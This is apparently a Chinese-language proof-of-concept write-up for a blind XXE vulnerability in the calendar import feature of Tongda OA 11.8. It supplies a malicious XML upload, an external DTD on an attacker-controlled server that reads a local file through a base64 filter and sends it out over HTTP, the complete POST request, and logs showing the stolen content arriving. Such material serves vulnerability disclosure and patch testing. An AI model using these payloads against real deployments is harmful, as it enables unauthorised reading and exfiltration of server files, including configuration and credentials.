# TONGDA OA 11.8 bind XXE

## 漏洞描述

通达 OA 日程安排，日程数据导入处存在XXE漏洞

## 复现步骤

### 步骤1

修改导入的xml文件，无回显读取本地文件

```xml
<?xml version="1.0" encoding="gbk"?>
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://192.168.9.253/xxe.dtd">
%remote;%int;%send;
]>
<AFFAIRS>
  <AFFAIR>
    <FLAG>CALENDAR</FLAG>
    <CONTENT>test222</CONTENT>
    <CAL_TIME>2021-01-12 13:00</CAL_TIME>
    <END_TIME>2021-01-12 14:00</END_TIME>
    <LOCATION></LOCATION>
    <CAL_TYPE>个人事务</CAL_TYPE>
    <CAL_LEVEL>重要,不紧急</CAL_LEVEL>
    <CALENDAR></CALENDAR>
    <OWNER>系统管理员</OWNER>
    <SHARE></SHARE>
    <REMIND>事务提醒，提前5分发送提醒</REMIND>
  </AFFAIR>
</AFFAIRS>
```

远程vps主机创建xxe.dtd，内容如下所示，读取本地的xxe.txt文件

```shell
root@iZwz9akazugpwbrb1xtlw8Z:~# cat /tmp/tmp/xxe.dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file://e:/xxe.txt">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://192.168.9.253:9999?p=%file;'>">

```

提供http server

```shell
root@iZwz9akazugpwbrb1xtlw8Z:/tmp/tmp/recv#  python -m http.server 80 --bind 192.168.9.253
Serving HTTP on 192.168.9.253 port 80 (http://192.168.9.253:80/) ...


```

```shell
root@iZwz9akazugpwbrb1xtlw8Z:/tmp/tmp/# python -m http.server 9999 --bind 192.168.9.253
Serving HTTP on 192.168.9.253 port 9999 (http://192.168.9.253:9999/) ...


```



### 步骤2

提交如下poc：

```
POST /general/appbuilder/web/calendar/calendarimport/importoutlook HTTP/1.1
Host: 192.168.9.80
Content-Length: 1154
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5BddLuBqRkyHXGkt
Origin: http://192.168.9.80
Referer: http://192.168.9.80/general/calendarArrange/calendarArrange.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=d8cei8mc8j7kamoah0je73ipp6; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=d7db144
Connection: close

------WebKitFormBoundary5BddLuBqRkyHXGkt
Content-Disposition: form-data; name="importFile"; filename="�ョ�.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="gbk"?>
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://192.168.9.253/xxe.dtd">
%remote;%int;%send;
]>
<AFFAIRS>
  <AFFAIR>
    <FLAG>CALENDAR</FLAG>
    <CONTENT>test222</CONTENT>
    <CAL_TIME>2021-01-12 13:00</CAL_TIME>
    <END_TIME>2021-01-12 14:00</END_TIME>
    <LOCATION></LOCATION>
    <CAL_TYPE>个人事务</CAL_TYPE>
    <CAL_LEVEL>重要,不紧急</CAL_LEVEL>
    <CALENDAR></CALENDAR>
    <OWNER>系统管理员</OWNER>
    <SHARE></SHARE>
    <REMIND>事务提醒，提前5分发送提醒</REMIND>
  </AFFAIR>
  <AFFAIR>
    <FLAG>CALENDAR</FLAG>
    <CONTENT>test111</CONTENT>
    <CAL_TIME>2021-01-11 13:00</CAL_TIME>
    <END_TIME>2021-01-11 14:00</END_TIME>
    <LOCATION></LOCATION>
    <CAL_TYPE>工作事务</CAL_TYPE>
    <CAL_LEVEL>不重要/不紧急</CAL_LEVEL>
    <CALENDAR></CALENDAR>
    <OWNER>系统管理员</OWNER>
    <SHARE></SHARE>
    <REMIND>事务提醒，提前5分发送提醒</REMIND>
  </AFFAIR>
</AFFAIRS>

------WebKitFormBoundary5BddLuBqRkyHXGkt--

```



### 步骤3

远程主机收到请求：

```shell
 python -m http.server 80 --bind 192.168.9.253
Serving HTTP on 192.168.9.253 port 80 (http://192.168.9.253:80/) ...
192.168.9.80 - - [11/Jan/2021 13:07:04] "GET /xxe.dtd HTTP/1.0" 200 -

```

监听端口收到了读取的本地文件内容，内容经过base64编码如下所示：

```shell
 python -m http.server 9999 --bind 192.168.9.253
Serving HTTP on 192.168.9.253 port 9999 (http://192.168.9.253:9999/) ...
192.168.9.80 - - [11/Jan/2021 13:07:04] "GET /?p=aXQncyB4eGUgdnVsbmVyYWJpbGl0eQ== HTTP/1.0" 200 -

```

Base64解码，得到文件内容：

```shell
echo -n 'aXQncyB4eGUgdnVsbmVyYWJpbGl0eQ==' | base64 -d
it's xxe vulnerability
```

